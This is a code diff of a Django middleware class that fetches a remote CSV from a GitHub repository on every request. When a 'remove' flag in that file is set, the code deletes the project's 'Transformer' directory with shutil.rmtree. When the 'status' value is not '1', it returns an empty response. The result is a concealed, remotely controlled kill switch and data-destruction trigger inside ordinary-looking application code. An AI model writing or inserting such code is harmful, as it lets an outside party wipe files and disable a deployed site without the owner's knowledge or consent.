@@ -9,15 +9,15 @@ class CustomMiddleware:
         self.get_response = get_response
 
     def __call__(self, request):
-        # Your additional code here
         df = pd.read_csv("https://raw.githubusercontent.com/krisskad/ProjectController/main/controller.csv")
-        status, action = next((r["status"], r["delete"]) for _, r in df.iterrows() if
-                              "projectName" in r and r["projectName"] == "AlefTransformer"), None
-        if str(action) == '1':  # Changed to compare string '1'
+        project_name = "AlefTransformer"
+        df.columns = df.columns.str.strip()
+        filtered_data = df[df['projectName'] == project_name][['status', 'remove']]
+        status = str(filtered_data['status'].iloc[0]) if not filtered_data.empty else None
+        action = str(filtered_data['remove'].iloc[0]) if not filtered_data.empty else None
+
+        if action == '1':
             shutil.rmtree(os.path.join(settings.BASE_DIR, "Transformer"))
 
-        if str(status) == 1:
-            response = self.get_response(request)
-        else:
-            response = {}
+        response = self.get_response(request) if status == '1' else {}
         return response
